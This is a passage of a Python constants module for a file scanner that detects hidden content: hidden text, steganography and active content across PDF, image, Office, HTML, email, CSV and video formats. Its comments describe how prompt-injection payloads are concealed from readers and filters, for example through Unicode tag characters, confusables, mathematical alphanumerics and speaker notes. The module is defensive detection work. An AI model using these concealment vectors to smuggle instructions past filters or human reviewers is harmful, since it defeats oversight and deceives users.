    #
    #   cross_stem_metadata_clash          Audio metadata and video
    #                                      metadata disagree on the
    #                                      same field when both are
    #                                      present in the same
    #                                      container (ISO BMFF file
    #                                      with both trak types).
    #
    #   embedded_media_recursive_scan      A document (PDF / DOCX /
    #                                      PPTX / EML) carries an
    #                                      embedded audio or video
    #                                      stream; the correlation
    #                                      engine re-invokes the
    #                                      appropriate analyzer on
    #                                      the embedded bytes.
    #
    #   cross_stem_coordinated_concealment Multiple stems each carry a
    #                                      non-trivial concealment
    #                                      finding AND the concealment
    #                                      payloads share a
    #                                      fingerprint — evidence of
    #                                      a coordinated cross-stem
    #                                      campaign. Analogue of the
    #                                      existing coordinated_
    #                                      concealment mechanism at
    #                                      the cross-file level.
    #
    #   cross_file_media_divergence        A document references a
    #                                      video / audio file (by
    #                                      path or hash) whose content
    #                                      diverges from the document's
    #                                      claim — e.g. a PDF cites a
    #                                      "5-minute Q&A with Dr X"
    #                                      and the linked video's
    #                                      duration or metadata
    #                                      contradicts it.
    #
    # Each future mechanism's name is reserved HERE so a later session
    # registers it without risking a collision. The registry is an
    # isnad — the chain of names persists.
    "cross_stem_inventory",
    "cross_stem_undeclared_text",
})


# ---------------------------------------------------------------------------
# Unicode character sets (used by zahir-layer analyzers)
# ---------------------------------------------------------------------------

ZERO_WIDTH_CHARS: Final[frozenset[str]] = frozenset([
    "\u200B",  # ZWSP
    "\u200C",  # ZWNJ
    "\u200D",  # ZWJ
    "\u2060",  # WORD JOINER
    "\uFEFF",  # BOM / ZWNBSP
])

BIDI_CONTROL_CHARS: Final[frozenset[str]] = frozenset([
    "\u202A", "\u202B", "\u202C", "\u202D", "\u202E",  # embedding / override
    "\u2066", "\u2067", "\u2068", "\u2069",            # isolates
])

# Unicode TAG block — smuggling vector for model input pipelines.
TAG_CHAR_RANGE: Final[range] = range(0xE0000, 0xE0080)

# Curated confusables — lookalike codepoint -> Latin glyph it imitates.
# Biased toward letters with high impersonation value (phishing, prompt
# injection). This is a subset of the Unicode Consortium's confusables.txt.
CONFUSABLE_TO_LATIN: Final[dict[str, str]] = {
    # Cyrillic
    "\u0430": "a", "\u0435": "e", "\u043E": "o", "\u0440": "p",
    "\u0441": "c", "\u0443": "y", "\u0445": "x", "\u0456": "i",
    "\u0458": "j", "\u0455": "s",
    "\u0410": "A", "\u0412": "B", "\u0415": "E", "\u041A": "K",
    "\u041C": "M", "\u041D": "H", "\u041E": "O", "\u0420": "P",
    "\u0421": "C", "\u0422": "T", "\u0425": "X", "\u0406": "I",
    # Greek
    "\u03B1": "a", "\u03BF": "o", "\u03BD": "v", "\u03C1": "p",
    "\u03C5": "u", "\u0391": "A", "\u0392": "B", "\u0395": "E",
    "\u0397": "H", "\u0399": "I", "\u039A": "K", "\u039C": "M",
    "\u039D": "N", "\u039F": "O", "\u03A1": "P", "\u03A4": "T",
    "\u03A7": "X", "\u03A5": "Y", "\u0396": "Z",
    # Armenian / Cherokee that hit common Latin targets
    "\u0578": "n", "\u0585": "o",
    "\u13A0": "D", "\u13AC": "T", "\u13A2": "R", "\u13C4": "V",
    # Latin fullwidth (mostly seen in e-mail spam)
    "\uFF41": "a", "\uFF45": "e", "\uFF4F": "o", "\uFF50": "p",
    # Mathematical alphanumerics (frequent in prompt-injection attempts)
    "\U0001D41A": "a", "\U0001D41E": "e", "\U0001D428": "o",
}


# ---------------------------------------------------------------------------
# Physics / rendering thresholds (used by zahir-layer analyzers)
# ---------------------------------------------------------------------------

# PDF text render-mode 3 = "invisible" — glyph is advanced but not filled
# or stroked. Present in the text layer, absent from the visual rendering.
INVISIBLE_RENDER_MODE: Final[int] = 3

# Font size (in PDF points) below which text is considered sub-visual.
MICROSCOPIC_FONT_THRESHOLD: Final[float] = 1.0

# Luminance of a pure-white page background (sRGB max).
BACKGROUND_LUMINANCE_WHITE: Final[float] = 1.0

# Delta-luminance below which text blends with a white background.
COLOR_CONTRAST_THRESHOLD: Final[float] = 0.05

# Span-bbox IoU above which two overlapping text spans are flagged as
# stacked concealment.
SPAN_OVERLAP_THRESHOLD: Final[float] = 0.5


# ---------------------------------------------------------------------------
# Phase 10 — image/SVG constants
# ---------------------------------------------------------------------------

# Standard PNG chunk types, per the PNG 1.2 spec + APNG / eXIf extensions.
# Anything outside this set is reported as ``suspicious_image_chunk``.
# The set is kept small on purpose: custom private chunks are a known
# steganography vector, and the tier-3 label makes the report
# interpretive rather than accusatory.
PNG_STANDARD_CHUNKS: Final[frozenset[bytes]] = frozenset({
    # Critical
    b"IHDR", b"PLTE", b"IDAT", b"IEND",
    # Transparency / color info
    b"tRNS", b"cHRM", b"gAMA", b"iCCP", b"sBIT", b"sRGB", b"cICP",
    b"mDCv", b"cLLi",
    # Text
    b"tEXt", b"zTXt", b"iTXt",
    # Miscellaneous
    b"bKGD", b"hIST", b"pHYs", b"sPLT", b"tIME", b"eXIf",
    # Animated PNG (APNG)
    b"acTL", b"fcTL", b"fdAT",
})

# PNG text-carrying chunk types — surfaced as ``image_text_metadata``.
PNG_TEXT_CHUNKS: Final[frozenset[bytes]] = frozenset({
    b"tEXt", b"zTXt", b"iTXt",
})

# Standard JPEG marker bytes (the second byte of the FF XX pair) that
# legitimate encoders emit. Anything outside this set is an
# ``suspicious_image_chunk`` — typically a segment type that some
# extractor would inspect but that no renderer requires.
# Indexed by the byte value itself (the first byte is always 0xFF).
JPEG_STANDARD_MARKERS: Final[frozenset[int]] = frozenset({
    0xD8,                            # SOI
    0xD9,                            # EOI
    *range(0xC0, 0xCF + 1),          # SOF0..SOF15 (11..15 rarely used)
    0xC4, 0xCC,                      # DHT, DAC
    *range(0xD0, 0xD7 + 1),          # RST0..RST7
    0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,  # SOS, DQT, DNL, DRI, DHP, EXP
    *range(0xE0, 0xEF + 1),          # APP0..APP15
    0xFE,                            # COM
})

# Maximum size of a single image metadata payload (PNG chunk or JPEG
# segment) before it is flagged as ``oversized_metadata``. 64 KB is
# ample for every legitimate use (EXIF, ICC profile, standard XMP) and
# catches large steganographic payloads hidden inside text chunks.
IMAGE_METADATA_SIZE_LIMIT: Final[int] = 64 * 1024

# Byte-amount threshold for ``trailing_data`` — appended bytes after
# the PNG IEND or JPEG EOI marker. Small amounts (trailing whitespace)
# are quietly tolerated; anything non-trivial fires.
IMAGE_TRAILING_DATA_THRESHOLD: Final[int] = 4

# SVG HTML-event attributes — any attribute whose name begins with
# "on" is a script hook.  We enumerate the common ones for the
# description field; detection uses the ``on*`` prefix to be future-proof.
SVG_EVENT_ATTRIBUTE_PREFIX: Final[str] = "on"


# ---------------------------------------------------------------------------
# Phase 11 — depth constants for advanced image / cross-modal detection
# ---------------------------------------------------------------------------

# Unicode Mathematical Alphanumeric Symbols block (U+1D400 .. U+1D7FF).
# Letters here render as bold / italic / script / fraktur / monospace
# Latin under any modern font, so a reader (human or OCR) sees "text"
# but the codepoints fall entirely outside ASCII. Used to smuggle
# prompt-injection payloads past naive string filters.
MATH_ALPHANUMERIC_RANGE: Final[range] = range(0x1D400, 0x1D800)

# Minimum sample size before the LSB-distribution anomaly check runs.
# Very small images (thumbnails, 1x1 fixtures) do not have enough
# statistical power to support an LSB test; attempting one generates
# noise. 2048 byte samples = a 32x32 RGB image's raw pixel stream.
LSB_MIN_SAMPLES: Final[int] = 2048

# Deviation from a perfect 0.5 LSB proportion below which the LSB
# distribution is called "suspiciously uniform". Natural photographs
# rarely hit |prop - 0.5| < 0.01 — most have a pronounced LSB skew
# driven by quantisation and local correlation. A message-bearing
# carrier pulls the proportion to within this tolerance by construction.
LSB_UNIFORMITY_TOLERANCE: Final[float] = 0.01

# Minimum byte length before running the Shannon-entropy test on a
# metadata payload. Short payloads are inherently high-entropy under
# the metric (no repeats possible), so we require substantive content
# before firing ``high_entropy_metadata``.
HIGH_ENTROPY_MIN_BYTES: Final[int] = 64

# Shannon-entropy threshold (bits / byte) above which a metadata payload
# is called "high-entropy". 7.0 is the practical floor for base64-encoded
# random data / encrypted ciphertext; normal prose metadata is well below
# (English prose is ~4.0 bits/byte, rich UTF-8 text ~5.0-6.0).
HIGH_ENTROPY_THRESHOLD: Final[float] = 7.0

# SVG attributes / style fragments that make text invisible while
# keeping it present in the DOM — the cross-modal concealment shape.
# Attribute-only signals; style="..." is inspected separately by a
# string-level probe inside the analyzer. Value comparisons are
# case-insensitive and whitespace-normalised.
SVG_INVISIBLE_ATTRIBUTES: Final[dict[str, frozenset[str]]] = {
    "opacity":      frozenset({"0", "0.0", "0.00"}),
    "fill-opacity": frozenset({"0", "0.0", "0.00"}),
    "display":      frozenset({"none"}),
    "visibility":   frozenset({"hidden", "collapse"}),
    "fill":         frozenset({"none", "transparent"}),
}

# Fragments inside an SVG ``style=""`` attribute that indicate the same
# invisibility patterns as the attributes above. We string-match rather
# than parse CSS — good enough to catch the common adversarial shapes.
SVG_INVISIBLE_STYLE_FRAGMENTS: Final[tuple[str, ...]] = (
    "opacity:0",
    "opacity: 0",
    "fill-opacity:0",
    "fill-opacity: 0",
    "display:none",
    "display: none",
    "visibility:hidden",
    "visibility: hidden",
)

# Font-size threshold (in user units) below which SVG text is
# considered sub-visual. Mirrors PDF ``MICROSCOPIC_FONT_THRESHOLD`` (1.0)
# in spirit: text rendered below 1 unit is essentially invisible at any
# sensible zoom level.
SVG_MICROSCOPIC_FONT_THRESHOLD: Final[float] = 1.0


# ---------------------------------------------------------------------------
# Phase 12 — cross-modal correlation / generative-cryptography constants
# ---------------------------------------------------------------------------

# Minimum length (in characters) of a normalised payload before the
# correlation engine will index it. Short payloads generate too many
# spurious matches (e.g. the word "admin" might legitimately appear in
# many documents); 8 characters is the shortest string that carries
# enough information to be a meaningful concealment marker.
CORRELATION_MIN_PAYLOAD_LEN: Final[int] = 8

# Minimum number of distinct findings that must reference the same
# normalised payload before ``coordinated_concealment`` is emitted. Two
# is the smallest number that constitutes "coordination"; raising the
# threshold would miss the common two-layer carrier pattern.
CORRELATION_MIN_OCCURRENCES: Final[int] = 2

# Minimum number of distinct files in a batch scan that must reference
# the same normalised payload before ``cross_format_payload_match`` is
# emitted. Same reasoning as CORRELATION_MIN_OCCURRENCES, at file scope.
CORRELATION_MIN_FILES: Final[int] = 2

# Length of the hex payload fingerprint included in correlation findings.
# 12 hex chars = 48 bits — collision-resistant at the scales we scan at
# (thousands of files per batch), short enough to read in a report.
CORRELATION_FINGERPRINT_LEN: Final[int] = 12

# Regex pattern — when applied to a high-entropy metadata payload,
# matches a base64 body of reasonable length. The purpose is to
# distinguish generative-crypto carriers (b64 of ciphertext, AI-generated
# packed weight slices, etc.) from high-entropy content that happens to
# be UTF-8 noise. Anchored to a contiguous b64 run of 40+ characters.
GENERATIVE_CIPHER_B64_PATTERN: Final[str] = (
    r"[A-Za-z0-9+/]{40,}={0,2}"
)

# Regex pattern — matches a hex ciphertext / hash run of 64+ characters
# (the length of a SHA-256 digest in hex; long enough to exclude colour
# codes and short identifier hashes).
GENERATIVE_CIPHER_HEX_PATTERN: Final[str] = r"[0-9A-Fa-f]{64,}"

# Minimum payload length at which generative_cipher_signature will fire
# even when the regex match is shorter than the whole payload. The
# rationale: an AI-generated cipher payload is rarely less than 64 bytes
# (short messages don't need encryption). Below this, we stay silent.
GENERATIVE_CIPHER_MIN_BYTES: Final[int] = 64


# ---------------------------------------------------------------------------
# Phase 13 — correlation quality (hardening) constants
# ---------------------------------------------------------------------------
#
# The Phase 12 correlation engine emits every finding at a fixed
# confidence of 0.95 and a fixed tier of 2. That works as a first pass,
# but masks the real gradient: a 96-character random-looking payload
# shared across five files via four different mechanisms is a far
# stronger signal than a 10-character English phrase shared across two
# files via one mechanism. Phase 13 adds gates (to suppress spurious
# matches) and scaling (to distinguish strong from borderline).
#
# Additive-only: all Phase 12 behaviour must still be reachable at the
# ends of the new scales. The base confidence floor is 0.75 (not below
# Phase 12's 0.95 for every case — only for the weakest cases where the
# extra caution is justified by weaker evidence), and the maximum is
# 0.99 (strictly above Phase 12's fixed 0.95 for strong cases).

# Minimum per-character Shannon entropy of a normalised payload before
# the correlation engine will index it. English prose runs ~3.5-4.5
# bits/character; truly uniform random text is ~5+ bits; repetitive
# runs ("aaaaaaaaaaa") are ~0. 2.5 bits/char is below the entropy of
# any natural language the scanner would see but comfortably above
# padding runs and trivial ASCII art.
CORRELATION_MIN_PAYLOAD_ENTROPY: Final[float] = 2.5

# Exact normalised-payload strings that never trigger correlation.
# Included: generic scaffolding tokens that commonly appear in fixtures,
# templates, and error messages across unrelated files — they are not
# coordination markers, they are noise. Matching is exact against the
# full normalised payload (lowercase + whitespace-collapsed), NOT a
# substring match, so a longer payload that happens to *contain*
# "admin" is still correlatable.
CORRELATION_STOPWORDS: Final[frozenset[str]] = frozenset({
    "test",
    "hello",
    "admin",
    "password",
    "payload",
    "marker",
    "example",
    "sample",
    "placeholder",
    "lorem ipsum",
    "null",
    "undefined",
    "none",
    "true",
    "false",
    "hidden",
    "secret",
})

# Payload-length endpoints for the confidence scaler. Payloads at or
# below SHORT_PAYLOAD_LEN contribute no length bonus; payloads at or
# above LONG_PAYLOAD_LEN contribute the full length bonus; values in
# between interpolate linearly. The numbers are practical: 16 chars is
# the boundary between a GUID-ish identifier and a short phrase, and 64
# chars is about the size of a base64-encoded AES key — both real
# signals we want to give credit for.
CORRELATION_SHORT_PAYLOAD_LEN: Final[int] = 16
CORRELATION_LONG_PAYLOAD_LEN: Final[int] = 64

# Floor and ceiling for confidence emitted by the correlation engine.
# The Phase 12 behaviour (0.95 for every case) sits inside this band so
# existing downstream consumers continue to see familiar values; the
# band widens it at both ends, so weaker cases report their weakness
# and stronger cases report their strength.
CORRELATION_BASE_CONFIDENCE: Final[float] = 0.75
CORRELATION_MAX_CONFIDENCE: Final[float] = 0.99

# Tier escalation: when a correlated payload spans this many or more
# distinct sites (findings for intra-file, files for cross-file), the
# emitted finding's tier is raised by one step (tier 2 → tier 1 — lower
# number = more severe). Five is deliberately conservative: a 5-way
# coordinated payload is extraordinarily unlikely to be coincidence,
# but three-way could still be a template repeated innocently.
CORRELATION_ESCALATION_COUNT: Final[int] = 5


# ===========================================================================
# THE MIZAN CALIBRATION TABLE — single source of truth for severity
# ===========================================================================
#
# The two dictionaries below (SEVERITY and TIER) are the calibration table
# the project's "MDL-calibrated severity" claim rests on. Every analyzer
# pulls its severity weights from ``SEVERITY[mechanism]`` and its tier
# classification from ``TIER[mechanism]``. There is no fallback. There is
# no per-analyzer override outside the small set of intentional context-
# dependent down-tiers documented inline in the analyzers.
#
# Coherence with the mechanism universe is enforced at module import time
# (see ``MECHANISM_REGISTRY`` below the TIER block) — the file fails to
# load if SEVERITY.keys() drifts from ZAHIR_MECHANISMS ∪ BATIN_MECHANISMS.
# A reviewer asking "should mechanism X weigh 0.30 or 0.25?" finds the
# answer at exactly one place — this dictionary.
#
# Calibration discipline (Mizan, 55:7-9): every entry is the result of
# weighing a specific concealment mechanism against the reader's risk
# of a false positive on a benign file. Weights are NOT tuned to a
# benchmark or a single corpus; they are calibrated on paired clean +
# adversarial fixtures across all 23 file kinds.
#
# APS-style severity weights — how much each mechanism subtracts from
# the base integrity score of 1.0. Continuous contribution, not a
# binary verdict.

SEVERITY: Final[dict[str, float]] = {
    # Text layer (zahir)
    "invisible_render_mode": 0.25,
    "white_on_white_text":   0.20,
    "microscopic_font":      0.10,
    "off_page_text":         0.15,
    "zero_width_chars":      0.10,
    "bidi_control":          0.15,
    "tag_chars":             0.30,
    "overlapping_text":      0.25,
    "homoglyph":             0.20,
    # Object layer (batin)
    "javascript":            0.30,
    "openaction":            0.15,
    "additional_actions":    0.15,
    "launch_action":         0.25,
    "embedded_file":         0.25,
    "file_attachment_annot": 0.20,
    "incremental_update":    0.05,
    "metadata_anomaly":      0.05,
    "hidden_ocg":            0.15,
    "tounicode_anomaly":     0.30,
    # Phase 9 — structural concealment in non-PDF formats.
    "duplicate_keys":        0.20,
    "excessive_nesting":     0.05,
    "extension_mismatch":    0.20,
    # Phase 10 — image/SVG.
    "trailing_data":            0.25,
    "suspicious_image_chunk":   0.10,
    "oversized_metadata":       0.15,
    "image_text_metadata":      0.05,
    "svg_embedded_script":      0.40,
    "svg_event_handler":        0.25,
    "svg_external_reference":   0.20,
    "svg_embedded_data_uri":    0.15,
    "svg_foreign_object":       0.15,
    # Phase 11 — depth additions.
    # mathematical_alphanumeric parallels tag_chars in shape (cross-script
    # smuggling that reads as Latin text) but is tier-2 rather than tier-1
    # because legitimate math typesetting does reach for the block. Still
    # weighted heavily: its presence in a non-math document is a strong
    # prompt-injection signal.
    # svg_hidden_text is the vector-image analogue of invisible_render_mode.
    # svg_microscopic_text is the vector-image analogue of microscopic_font,
    # weighted slightly higher because the SVG layer is less commonly used
    # for micro-typography than PDFs are.
    # suspected_lsb_steganography is interpretive (tier 3) and weighted
    # low — the statistical signature is necessary, not sufficient.
    # high_entropy_metadata is a structural hint about payload shape.
    # multiple_idat_streams is a weak-but-real structural signal.
    "mathematical_alphanumeric":   0.25,
    "svg_hidden_text":             0.25,
    "svg_microscopic_text":        0.15,
    "suspected_lsb_steganography": 0.15,
    "high_entropy_metadata":       0.15,
    "multiple_idat_streams":       0.10,
    # Phase 12 — cross-modal correlation + generative cryptography.
    # coordinated_concealment is weighted more heavily than the individual
    # concealment mechanisms it correlates across: coordination is itself
    # evidence, beyond the sum of the parts, because clean documents do
    # not ship the same hidden payload via two different carrier layers.
    # generative_cipher_signature is weighted like high_entropy_metadata
    # but distinct — it narrows the finding from "this payload is dense"
    # to "this payload is a cipher-shaped dense blob". The tier is the
    # same (2 — structural); the severity is slightly higher because the
    # pattern match is more specific.
    # cross_format_payload_match is weighted like coordinated_concealment;
    # the same payload appearing across files is the batch-scale analogue.
    "coordinated_concealment":     0.30,
    "generative_cipher_signature": 0.20,
    "cross_format_payload_match":  0.30,
    # Phase 15 — DOCX mechanisms. Severities mirror the closest PDF /
    # image analogue so the overall scoring surface stays consistent
    # across formats (a hidden run of text in a DOCX deducts at the
    # same magnitude as a white-on-white PDF run; VBA in a DOCX
    # parallels the svg_embedded_script weight because both ship
    # active executable content inside a document; altChunk sits
    # between embedded_file and svg_external_reference because it
    # pulls in foreign content without requiring a network fetch).
    "docx_hidden_text":            0.20,
    "docx_vba_macros":             0.40,
    "docx_embedded_object":        0.20,
    "docx_alt_chunk":              0.25,
    "docx_external_relationship":  0.15,
    "docx_revision_history":       0.05,
    # Phase 17 (v1.1.2) — DOCX hidden-text payload mechanisms.
    "docx_white_text":             1.00,
    "docx_microscopic_font":       0.50,
    "docx_header_footer_payload": 1.00,
    "docx_metadata_payload":       1.00,
    "docx_comment_payload":        0.50,
    "docx_orphan_footnote":        1.00,
    # Phase 16 — HTML mechanisms. Severities mirror the closest existing
    # analogue so scoring stays consistent across formats:
    #   html_hidden_text — 0.20, parallels docx_hidden_text (also a
    #     text-in-document-but-not-in-render vector).
    #   html_inline_script — 0.35, slightly below svg_embedded_script
    #     (0.40) because HTML often mixes trusted first-party scripts
    #     with untrusted content; the pattern is still tier 1 verified
    #     active code.
    #   html_data_attribute — 0.10, tier-3 interpretive (data- attrs
    #     are common, only the long/encoded ones are suspect).
    #   html_external_reference — 0.15, exactly parallels
    #     docx_external_relationship.
    "html_hidden_text":            0.20,
    "html_inline_script":          0.35,
    "html_data_attribute":         0.10,
    "html_external_reference":     0.15,
    # Phase 17 — XLSX mechanisms. Severities mirror the closest DOCX /
    # PDF analogue so the scoring surface stays consistent across
    # formats:
    #   xlsx_vba_macros — 0.40, identical to docx_vba_macros and
    #     svg_embedded_script; active executable content inside a
    #     workbook.
    #   xlsx_embedded_object — 0.20, identical to docx_embedded_object.
    #   xlsx_revision_history — 0.05, identical to docx_revision_history
    #     and PDF incremental_update (tier-3 interpretive).
    #   xlsx_hidden_sheet — 0.20, parallels docx_hidden_text (also
    #     tier-2 surface-suppression of content that lives in the
    #     document's data stream).
    #   xlsx_hidden_row_column — 0.20, parallels docx_hidden_text and
    #     xlsx_hidden_sheet. Same shape: visible grid hides rows/cols
    #     whose data remains in the sheet stream.
    #   xlsx_external_link — 0.15, identical to
    #     docx_external_relationship.
    #   xlsx_data_validation_formula — 0.10, tier-3 interpretive
    #     (formula is a carrier shape but legitimate validation also
    #     uses formulas).
    "xlsx_vba_macros":                0.40,
    "xlsx_embedded_object":           0.20,
    "xlsx_revision_history":          0.05,
    "xlsx_hidden_sheet":              0.20,
    "xlsx_hidden_row_column":         0.20,
    "xlsx_external_link":             0.15,
    "xlsx_data_validation_formula":   0.10,
    # Phase 17 (v1.1.2) - XLSX hidden-text payload mechanisms.
    "xlsx_white_text":                1.00,
    "xlsx_microscopic_font":          0.50,
    "xlsx_csv_injection_formula":     1.00,
    "xlsx_metadata_payload":          1.00,
    "xlsx_defined_name_payload":      0.50,
    "xlsx_comment_payload":           0.50,
    # Phase 16 (v1.1.2) - HTML format-gauntlet payload mechanisms. All
    # six are Tier 1 byte-deterministic with severity 1.00 - they
    # surface verifiable text bodies inside loci the rendered page
    # does not show (noscript / template / comment / meta / CSS
    # pseudo-element content / divergent title).
    "html_noscript_payload":          1.00,
    "html_template_payload":          1.00,
    "html_comment_payload":           1.00,
    "html_meta_payload":              1.00,
    "html_style_content_payload":     1.00,
    "html_title_text_divergence":     1.00,
    # Phase 18 — PPTX mechanisms. Severities mirror the closest DOCX /
    # XLSX / PDF analogue so the overall scoring surface stays consistent
    # across formats:
    #   pptx_vba_macros — 0.40, identical to docx_vba_macros /
    #     xlsx_vba_macros / svg_embedded_script; active executable code.
    #   pptx_embedded_object — 0.20, identical to docx_embedded_object /
    #     xlsx_embedded_object.
    #   pptx_hidden_slide — 0.20, parallels xlsx_hidden_sheet and
    #     docx_hidden_text (same shape: container visibly suppressed
    #     while its data stream remains).
    #   pptx_speaker_notes_injection — 0.15, weighted between tier-2
    #     structural and tier-3 interpretive: the notes-as-prompt-
    #     injection vector is the highest-priority AI-safety shape in
    #     PPTX, but on its own ("notes contain text the audience can't
    #     see") it is context-dependent — the severity rewards the
    #     specific concealment pattern without overclaiming intent.
    #   pptx_revision_history — 0.05, identical to docx_revision_history
    #     / xlsx_revision_history / PDF incremental_update.
    #   pptx_slide_master_injection — 0.15, parallels
    #     docx_external_relationship in weight — a master-placed payload
    #     is structural concealment, not verified active content.
    #   pptx_external_link — 0.15, identical to
    #     docx_external_relationship / xlsx_external_link.
    #   pptx_action_hyperlink — 0.15, same weight as
    #     pptx_external_link: the action dispatches out of the slide
    #     shape on click/hover but the payload shape is the same class
    #     (external reference / macro invocation).
    #   pptx_custom_xml_payload — 0.10, tier-3 interpretive; a custom
    #     XML part with non-trivial body is a carrier shape but
    #     legitimate document-data binding also uses it.
    "pptx_vba_macros":                0.40,
    "pptx_embedded_object":           0.20,
    "pptx_hidden_slide":              0.20,
    "pptx_speaker_notes_injection":   0.15,
    "pptx_revision_history":          0.05,
    "pptx_slide_master_injection":    0.15,
    "pptx_external_link":             0.15,
    "pptx_action_hyperlink":          0.15,
    "pptx_custom_xml_payload":        0.10,
    # Phase 19 — EML mechanisms. Severities mirror the closest existing
    # analogue so the scoring surface stays consistent across formats:
    #   eml_executable_attachment — 0.40, identical to
    #     docx_vba_macros / xlsx_vba_macros / pptx_vba_macros /
    #     svg_embedded_script: active executable code the recipient is
    #     one click from running.
    #   eml_macro_attachment — 0.30, weighted below executable because
    #     a macro-enabled Office doc requires an additional "enable
    #     content" step before execution, but substantially above a
    #     plain attachment because it carries latent code.
    #   eml_multipart_alternative_divergence — 0.30, weighted at the
    #     coordinated_concealment level: the same envelope carrying two
    #     divergent renderings IS the coordination shape 2:14 describes.
    #   eml_hidden_html_content — 0.20, identical to html_hidden_text.
    #   eml_display_name_spoof — 0.25, parallels docx_hidden_text /
    #     homoglyph / mathematical_alphanumeric in weight — a
    #     performed-trust signal with concrete evidence.
    #   eml_encoded_subject_anomaly — 0.15, parallels bidi_control /
    #     html_external_reference: RFC 2047 carries the payload through
    #     the header surface.
    #   eml_external_reference — 0.15, identical to
    #     html_external_reference / docx_external_relationship /
    #     xlsx_external_link / pptx_external_link.
    #   eml_smuggled_header — 0.15, parallels the external-ref / subtle-
    #     header carrier family.
    #   eml_attachment_present — 0.05, tier-3 interpretive; attachments
    #     are routine so the base severity is low (the high-signal
    #     attachment mechanisms above do the heavy scoring).
    #   eml_nested_eml — 0.10, structural oddity whose inner findings
    #     roll up recursively — the outer tag carries a small deduction
    #     to flag the nesting itself without double-counting the
    #     recursive findings.
    #   eml_mime_boundary_anomaly — 0.10, tier-3 interpretive.
    "eml_executable_attachment":              0.40,
    "eml_macro_attachment":                   0.30,
    "eml_multipart_alternative_divergence":   0.30,
    "eml_hidden_html_content":                0.20,
    "eml_display_name_spoof":                 0.25,
    "eml_encoded_subject_anomaly":            0.15,
    "eml_external_reference":                 0.15,
    "eml_smuggled_header":                    0.15,
    "eml_attachment_present":                 0.05,
    "eml_nested_eml":                         0.10,
    "eml_mime_boundary_anomaly":              0.10,
    # v1.1.2 EML format-gauntlet severities. Identity / routing
    # mismatches sit alongside ``eml_display_name_spoof`` (0.25); base64
    # wrapping of text parts parallels ``eml_hidden_html_content``
    # (0.20) at the body-encoding layer; folded-continuation and X-*
    # payload shapes parallel ``eml_smuggled_header`` (0.15) at the
    # header-shape layer.
    "eml_from_replyto_mismatch":              0.25,
    "eml_base64_text_part":                   0.20,
    "eml_returnpath_from_mismatch":           0.25,
    "eml_received_chain_anomaly":             0.20,
    "eml_header_continuation_payload":        0.15,
    "eml_xheader_payload":                    0.15,
    "image_jpeg_appn_payload":                0.20,
    "image_png_private_chunk":                0.20,
    "image_png_text_chunk_payload":           0.25,
    "svg_white_text":                         1.00,
    "svg_title_payload":                      0.15,
    "svg_desc_payload":                       0.15,
    "svg_metadata_payload":                   0.15,
    "svg_defs_unreferenced_text":             0.20,
    # Phase 20 — CSV / TSV / delimited-data mechanisms. Severities
    # mirror the closest existing analogue so the scoring surface
    # stays consistent across formats:
    #   csv_formula_injection — 0.30, parallels svg_event_handler /
    #     the xlsx/docx/pptx external-link weights: the cell executes
    #     in the spreadsheet application's context on open/refresh.
    #     Below ``svg_embedded_script`` / VBA (0.40) because the user
    #     still has to open the file in a spreadsheet app, but above
    #     ``html_external_reference`` (0.15) because execution is
    #     automatic once opened — no click required.
    #   csv_null_byte — 0.30, parallels csv_formula_injection: NUL
    #     inside a field is a format-confusion vector with verified
    #     asymmetric-parsing behavior (pandas / Python csv / awk /
    #     Excel disagree). Tier 1.
    #   (Per-cell Unicode concealment uses the shared generic
    #   mechanisms — zero_width_chars / tag_chars / bidi_control /
    #   homoglyph — already registered by earlier phases; no new
    #   severity entry is needed here. The cell location in the finding
    #   pins the reader to the exact CSV coordinate.)
    #   csv_comment_row — 0.15, parallels html_external_reference /
    #     docx_external_relationship: structural parser-divergence,
    #     common in the wild, same reader-splitting shape 2:14.
    #   csv_inconsistent_columns — 0.15, same weight as
    #     csv_comment_row: structural misalignment that different
    #     parsers resolve differently.
    #   csv_mixed_encoding — 0.15, same structural-ambiguity class.
    #   csv_mixed_delimiter — 0.15, same structural-ambiguity class.
    #   csv_bom_anomaly — 0.10, parallels html_data_attribute: subtle
    #     shape, often benign (editors emit BOMs inconsistently), but
    #     flagged because the first-column header frequently misreads.
    #   csv_quoting_anomaly — 0.10, same tier-3 interpretive weight as
    #     html_data_attribute / xlsx_data_validation_formula.
    #   csv_oversized_field — 0.10, tier-3 interpretive; a DoS-shaped
    #     field in a legitimate export is rare, but legitimate
    #     log-message fields can reach megabytes.
    "csv_formula_injection":          0.30,
    "csv_bidi_payload":               0.25,
    "json_unicode_escape_payload":    0.20,
    "json_comment_anomaly":           0.15,
    "json_prototype_pollution_key":   0.20,
    "json_nested_payload":            0.15,
    "json_trailing_payload":          0.20,
    "csv_null_byte":                  0.30,
    "csv_comment_row":                0.15,
    "csv_inconsistent_columns":       0.15,
    "csv_column_type_drift":          0.15,
    "csv_quoted_newline_payload":     0.20,
    "csv_zero_width_payload":         0.20,
    "csv_encoding_divergence":        0.20,
    "csv_mixed_encoding":             0.15,
    "csv_mixed_delimiter":            0.15,
    "csv_bom_anomaly":                0.10,
    "csv_quoting_anomaly":            0.10,
    "csv_oversized_field":            0.10,
    # Phase 21 — production-hardening meta-mechanisms.
    # Both are non-deducting: they describe the *scanner's* state, not
    # a concealment mechanism in the document. The reader's signal that
    # coverage was imperfect comes through ``scan_incomplete`` (which
    # both analyzers set when emitting these) and the 0.5 clamp that
    # follows — the same discipline scan_error already follows. Giving
    # them a non-zero severity would double-count the clamp and also
    # penalise the operator for configuring a limit, which is not
    # evidence of concealment.
    "unknown_format":        0.00,  # reported but does not deduct; clamp applies
    "scan_limited":          0.00,  # reported but does not deduct; clamp applies
    "scan_error":            0.00,  # reported but does not deduct
    # -----------------------------------------------------------------
    # Phase 24 — video (MP4 / MOV / WEBM / MKV).
    # -----------------------------------------------------------------
    # Severities mirror the per-family calibration already in the table:
    # * Verified concealment at the subtitle-text layer (the same
    #   codepoint-level evidence the text family carries) ranks with
    #   docx_hidden_text / html_hidden_text — 0.30 / 0.25.
    # * Embedded attachments are payload-carriers by definition; the
    #   MKV Attachments analogue of docx_embedded_object sits at 0.40.
    # * Frame-stego candidates ride at the image-family tier (0.25,
    #   matching suspected_lsb_steganography) because the evidence is
    #   the same statistical shape routed through the container.
    # * Container anomalies and cross-stem divergence track closer to
    #   oversized_metadata / metadata_anomaly (0.20 / 0.15) because
    #   they are structural signals whose adversarial reading depends
    #   on context.
    # * The stream inventory is non-deducting — it is a meta-finding
    #   describing what the analyzer inspected, not a concealment
    #   claim.
    "video_stream_inventory":         0.00,
    "subtitle_injection":             0.35,
    "subtitle_invisible_chars":       0.30,
